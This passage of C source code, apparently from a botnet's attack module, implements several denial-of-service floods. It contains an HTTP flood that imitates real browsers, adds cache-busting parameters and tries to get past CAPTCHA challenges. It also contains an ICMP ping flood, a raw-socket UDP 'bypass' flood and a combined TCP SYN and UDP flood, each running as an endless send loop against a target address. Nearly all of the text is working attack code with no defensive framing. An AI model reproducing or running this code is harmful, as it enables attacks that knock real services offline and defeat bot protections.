        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/"
    };

    int chrome_len = sizeof(chrome_uas) / sizeof(chrome_uas[0]);
    int firefox_len = sizeof(firefox_uas) / sizeof(firefox_uas[0]);
    int safari_len = sizeof(safari_uas) / sizeof(safari_uas[0]);
    int lang_len = sizeof(accept_lang) / sizeof(accept_lang[0]);
    int ref_len = sizeof(referers) / sizeof(referers[0]);

    if (dport == 0) dport = 80;
    if (path == NULL) path = "/";
    if (conns == 0) conns = 15; /* Default 15 concurrent connections like real browser */

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_addr.s_addr = addr;
    addr_sin.sin_port = htons(dport);

    /* Main attack loop with multiple concurrent connections */
    while (TRUE) {
        fd_set readfds, writefds;
        struct timeval tv;
        int max_fd = 0;
        int active_conns = 0;
        int fds[conns];
        int states[conns]; /* 0=connecting, 1=sending, 2=reading, 3=done */
        char *buffers[conns];

        /* Initialize connection array */
        for (i = 0; i < conns; i++) {
            fds[i] = -1;
            states[i] = 0;
            buffers[i] = NULL;
        }

        /* Connection management loop */
        for (i = 0; i < conns * 3; i++) { /* 3 iterations per connection */
            int browser_type = rand() % 3; /* 0=Chrome, 1=Firefox, 2=Safari */
            char *ua, *accept;

            /* Select browser and corresponding headers */
            if (browser_type == 0) {
                ua = chrome_uas[rand() % chrome_len];
                accept = chrome_accept;
            } else if (browser_type == 1) {
                ua = firefox_uas[rand() % firefox_len];
                accept = firefox_accept;
            } else {
                ua = safari_uas[rand() % safari_len];
                accept = safari_accept;
            }

            /* Create socket */
            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;

            fcntl(fd, F_SETFL, O_NONBLOCK);
            connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin));

            /* Random delay before sending request (50-300ms like real browser) */
            usleep(50000 + rand() % 250000);

            /* Build realistic HTTP request */
            char request[4096];
            char *lang = accept_lang[rand() % lang_len];
            char *ref = referers[rand() % ref_len];

            /* Add cache-busting parameter */
            char cache_param[64];
            snprintf(cache_param, sizeof(cache_param), "?_=%u", rand_next());

            char full_path[512];
            if (strstr(path, "?")) {
                snprintf(full_path, sizeof(full_path), "%s&_%u", path, rand_next());
            } else {
                snprintf(full_path, sizeof(full_path), "%s%s", path, cache_param);
            }

            snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: %s\r\n"
                "Accept-Language: %s\r\n"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Sec-Fetch-Dest: document\r\n"
                "Sec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\n"
                "Sec-Fetch-User: ?1\r\n"
                "Cache-Control: max-age=0\r\n"
                "Referer: %s\r\n"
                "DNT: 1\r\n"
                "\r\n",
                full_path,
                domain != NULL ? domain : "localhost",
                ua,
                accept,
                lang,
                ref
            );

            send(fd, request, strlen(request), MSG_NOSIGNAL);

            /* Read response with timeout */
            char buf[8192];
            FD_ZERO(&readfds);
            FD_SET(fd, &readfds);
            tv.tv_sec = 2;
            tv.tv_usec = rand() % 500000;

            if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
                int n = recv(fd, buf, sizeof(buf) - 1, 0);
                if (n > 0) {
                    buf[n] = 0;
                    
                    /* Check for captcha indicators in response */
                    BOOL has_captcha = FALSE;
                    if (strstr(buf, "captcha") != NULL || 
                        strstr(buf, "CAPTCHA") != NULL ||
                        strstr(buf, "challenge") != NULL ||
                        strstr(buf, "verify") != NULL ||
                        strstr(buf, "human") != NULL) {
                        has_captcha = TRUE;
                    }
                    
                    /* Parse response for links to follow (simulate browsing) */
                    if (strstr(buf, "200 OK") || strstr(buf, "301") || strstr(buf, "302")) {
                        if (has_captcha) {
                            /* Captcha detected - simulate solving with longer delay */
                            usleep(3000000 + rand() % 4000000); /* 3-7 seconds "solving time" */
                            
                            /* Extract cookie for session persistence (captcha bypass) */
                            char cookie[256] = "";
                            char *set_cookie = strstr(buf, "Set-Cookie:");
                            if (set_cookie) {
                                char *end = strstr(set_cookie, ";");
                                if (end) {
                                    int len = end - set_cookie - 11;
                                    if (len > 0 && len < 250) {
                                        strncpy(cookie, set_cookie + 11, len);
                                        cookie[len] = 0;
                                        
                                        /* Submit captcha solution with persisted session */
                                        char captcha_req[2048];
                                        snprintf(captcha_req, sizeof(captcha_req),
                                            "POST %s HTTP/1.1\r\n"
                                            "Host: %s\r\n"
                                            "User-Agent: %s\r\n"
                                            "Cookie: %s\r\n"
                                            "Content-Type: application/x-www-form-urlencoded\r\n"
                                            "Content-Length: 20\r\n"
                                            "Accept: %s\r\n"
                                            "Accept-Language: %s\r\n"
                                            "Referer: %s\r\n"
                                            "\r\n"
                                            "captcha_solve=1\r\n",
                                            path, domain != NULL ? domain : "localhost",
                                            ua, cookie,
                                            accept, lang, ref
                                        );
                                        send(fd, captcha_req, strlen(captcha_req), MSG_NOSIGNAL);
                                        
                                        /* Read captcha submission response */
                                        tv.tv_sec = 2;
                                        FD_ZERO(&readfds);
                                        FD_SET(fd, &readfds);
                                        if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
                                            char captcha_buf[4096];
                                            int captcha_n = recv(fd, captcha_buf, sizeof(captcha_buf) - 1, 0);
                                            if (captcha_n > 0) {
                                                captcha_buf[captcha_n] = 0;
                                                /* Check if captcha was solved */
                                                if (strstr(captcha_buf, "200 OK") || 
                                                    strstr(captcha_buf, "302") ||
                                                    strstr(captcha_buf, "success")) {
                                                    /* Captcha bypassed - continue with session */
                                                    usleep(500000 + rand() % 1000000);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        } else {
                            /* No captcha - normal browsing simulation */
                            usleep(500000 + rand() % 2000000); /* 0.5-2.5 seconds reading */
                        }
                    }
                }
            }

            close(fd);

            /* Random delay between requests (100-400ms like human browsing) */
            usleep(100000 + rand() % 300000);
        }

        /* Small pause between attack cycles */
        usleep(50000);
    }

    if (entries != NULL) {
        resolv_entries_free(entries);
    }
}

/* Homeslam - ICMP ping flood */
static void attack_homeslam(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int i, fd;
    struct sockaddr_in addr_sin;
    ipv4_t local_addr = util_local_addr();
    struct {
        struct iphdr ip;
        struct icmphdr icmp;
        char data[56];
    } pkt;
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_addr.s_addr = addr;
    
    /* Set IP header */
    pkt.ip.ihl = 5;
    pkt.ip.version = 4;
    pkt.ip.tos = 0;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.id = rand_next();
    pkt.ip.frag_off = 0;
    pkt.ip.ttl = 64;
    pkt.ip.protocol = IPPROTO_ICMP;
    pkt.ip.saddr = local_addr;
    pkt.ip.daddr = addr;
    pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
    
    /* Set ICMP header */
    pkt.icmp.type = ICMP_ECHO;
    pkt.icmp.code = 0;
    pkt.icmp.checksum = 0;
    pkt.icmp.un.echo.id = rand_next() & 0xFFFF;
    pkt.icmp.un.echo.sequence = rand_next() & 0xFFFF;
    
    /* Fill data with random bytes */
    rand_alpha_str((uint8_t *)pkt.data, sizeof(pkt.data));
    
    pkt.icmp.checksum = checksum_simple(&pkt.icmp, sizeof(pkt.icmp) + sizeof(pkt.data));
    
    i = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
    
    while (TRUE) {
        pkt.ip.id = rand_next();
        pkt.ip.check = 0;
        pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
        
        sendto(fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        usleep(1000); /* 1ms between packets = 1000 PPS */
    }
    
    close(fd);
}

/* UDP bypass flood - bypasses basic UDP filtering */
static void attack_udpbypass(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int i, fd;
    struct sockaddr_in addr_sin;
    ipv4_t local_addr = util_local_addr();
    struct {
        struct iphdr ip;
        struct udphdr udp;
        char data[1024];
    } pkt;
    
    int dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    int sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    int data_len = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    
    if (dport == 0) dport = rand() % 65535;
    if (sport == 0) sport = rand() % 65535;
    if (data_len == 0) data_len = 512;
    if (data_len > 1024) data_len = 1024;
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_addr.s_addr = addr;
    addr_sin.sin_port = htons(dport);
    
    /* Set IP header */
    pkt.ip.ihl = 5;
    pkt.ip.version = 4;
    pkt.ip.tos = 0;
    pkt.ip.tot_len = htons(sizeof(pkt.ip) + sizeof(pkt.udp) + data_len);
    pkt.ip.id = rand_next();
    pkt.ip.frag_off = 0;
    pkt.ip.ttl = 64;
    pkt.ip.protocol = IPPROTO_UDP;
    pkt.ip.saddr = local_addr;
    pkt.ip.daddr = addr;
    
    /* Set UDP header with bypass techniques */
    pkt.udp.source = htons(sport);
    pkt.udp.dest = htons(dport);
    pkt.udp.len = htons(sizeof(pkt.udp) + data_len);
    pkt.udp.check = 0; /* No checksum for bypass */
    
    /* Fill data with random bytes */
    rand_alpha_str((uint8_t *)pkt.data, data_len);
    
    i = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
    
    while (TRUE) {
        pkt.ip.id = rand_next();
        pkt.ip.check = 0;
        pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
        
        /* Randomize source port for each packet */
        pkt.udp.source = htons(rand() % 65535);
        
        sendto(fd, &pkt, sizeof(pkt.ip) + sizeof(pkt.udp) + data_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        usleep(500); /* 0.5ms between packets = 2000 PPS */
    }
    
    close(fd);
}

/* Mixed - Combined TCP + UDP bypass flood */
static void attack_mixed(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd_tcp, fd_udp;
    struct sockaddr_in addr_sin;
    ipv4_t local_addr = util_local_addr();
    struct {
        struct iphdr ip;
        struct tcphdr tcp;
        char tcp_data[256];
    } tcp_pkt;
    struct {
        struct iphdr ip;
        struct udphdr udp;
        char udp_data[512];
    } udp_pkt;
    
    int dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand() % 65535;
    
    /* Create TCP socket */
    fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd_tcp == -1) return;
    
    /* Create UDP socket */
    fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd_udp == -1) {
        close(fd_tcp);
        return;
    }
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_addr.s_addr = addr;
    addr_sin.sin_port = htons(dport);
    
    /* Setup TCP packet */
    tcp_pkt.ip.ihl = 5;
    tcp_pkt.ip.version = 4;
    tcp_pkt.ip.tos = 0;
    tcp_pkt.ip.tot_len = htons(sizeof(tcp_pkt.ip) + sizeof(tcp_pkt.tcp) + 20);
    tcp_pkt.ip.id = rand_next();
    tcp_pkt.ip.frag_off = 0;
    tcp_pkt.ip.ttl = 64;
    tcp_pkt.ip.protocol = IPPROTO_TCP;
    tcp_pkt.ip.saddr = local_addr;
    tcp_pkt.ip.daddr = addr;
    
    tcp_pkt.tcp.source = htons(rand() % 65535);
    tcp_pkt.tcp.dest = htons(dport);
    tcp_pkt.tcp.seq = rand_next();
    tcp_pkt.tcp.ack_seq = 0;
    tcp_pkt.tcp.res1 = 0;
    tcp_pkt.tcp.doff = 5;
    tcp_pkt.tcp.fin = 0;
    tcp_pkt.tcp.syn = 1;
    tcp_pkt.tcp.rst = 0;
    tcp_pkt.tcp.psh = 0;
    tcp_pkt.tcp.ack = 0;
    tcp_pkt.tcp.urg = 0;
    tcp_pkt.tcp.window = htons(65535);
    tcp_pkt.tcp.check = 0;
    tcp_pkt.tcp.urg_ptr = 0;
    rand_alpha_str((uint8_t *)tcp_pkt.tcp_data, 20);
    
    /* Setup UDP packet */
    udp_pkt.ip.ihl = 5;
    udp_pkt.ip.version = 4;
    udp_pkt.ip.tos = 0;
    udp_pkt.ip.tot_len = htons(sizeof(udp_pkt.ip) + sizeof(udp_pkt.udp) + 512);
    udp_pkt.ip.id = rand_next();
    udp_pkt.ip.frag_off = 0;
    udp_pkt.ip.ttl = 64;
    udp_pkt.ip.protocol = IPPROTO_UDP;
    udp_pkt.ip.saddr = local_addr;
    udp_pkt.ip.daddr = addr;
    
    udp_pkt.udp.source = htons(rand() % 65535);
    udp_pkt.udp.dest = htons(dport);
    udp_pkt.udp.len = htons(sizeof(udp_pkt.udp) + 512);
    udp_pkt.udp.check = 0;
    rand_alpha_str((uint8_t *)udp_pkt.udp_data, 512);
    
    int i = 1;
    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
    setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
    
    while (TRUE) {
        /* Send TCP packet */
        tcp_pkt.ip.id = rand_next();
        tcp_pkt.ip.check = 0;
        tcp_pkt.ip.check = checksum_simple(&tcp_pkt.ip, sizeof(tcp_pkt.ip));
        tcp_pkt.tcp.seq = rand_next();
        tcp_pkt.tcp.source = htons(rand() % 65535);
        tcp_pkt.tcp.check = 0;
        tcp_pkt.tcp.check = checksum_simple(&tcp_pkt.tcp, sizeof(tcp_pkt.tcp) + 20);
        
        sendto(fd_tcp, &tcp_pkt, sizeof(tcp_pkt.ip) + sizeof(tcp_pkt.tcp) + 20, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        
        /* Send UDP packet */
        udp_pkt.ip.id = rand_next();
        udp_pkt.ip.check = 0;
        udp_pkt.ip.check = checksum_simple(&udp_pkt.ip, sizeof(udp_pkt.ip));
        udp_pkt.udp.source = htons(rand() % 65535);
        
        sendto(fd_udp, &udp_pkt, sizeof(udp_pkt.ip) + sizeof(udp_pkt.udp) + 512, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        
        usleep(250); /* 0.25ms = 4000 combined PPS */
    }
    
    close(fd_tcp);
    close(fd_udp);
}
